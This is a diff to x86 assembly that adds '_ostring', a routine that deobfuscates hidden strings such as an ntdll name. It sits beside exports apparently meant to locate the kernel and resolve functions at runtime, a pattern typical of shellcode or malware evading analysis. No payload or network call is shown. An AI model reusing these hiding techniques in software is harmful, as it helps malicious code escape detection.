@@ -1,18 +1,44 @@
 align 16
 section .data
 count dd 0;
+%include "ostrings.inc"
+dostring times  255 db 0x00
 
 section .text
 GLOBAL _startrand
 GLOBAL _findkernel
 GLOBAL _getfunction
 GLOBAL _conv7to8
+GLOBAL _ostring
 
 
-; xxxxxxxx oooooooo xxxxxxxx oooooooo xxxxxxxx oooooooo xxxxxxxx
-; xxxxxxx  xoooooo  ooxxxxx  xxxoooo  ooooxxx  xxxxxoo  oooooox  xxxxxxx 
-; 0      7 8      1 1      2 2      2 2
-;                 4 5      1 2      7 8 
+; Deobfuscate a string 
+_ostring:
+ 	int3
+	mov	edi, dostring
+	mov esi, str_ntdll
+	xor edx,edx
+	mov	ecx,[allstroff]   ; offset srtings
+.osloop
+	xor eax,eax
+	lodsb	; lis char
+	test	al,al
+	je	.ostringdone
+	mov 	dl,al
+	lodsb   ; 1
+	shl	eax,2  ; x4
+	mov	eax, [allstroff+eax]
+  add eax,ecx
+	mov al, [eax+edx-1]
+	stosb
+	jmp	.osloop
+
+.ostringdone
+	xor	eax,eax
+	stosb	
+	mov eax, dostring
+  ret
+
 
 _conv7to8
 	;int3	; breakpoint
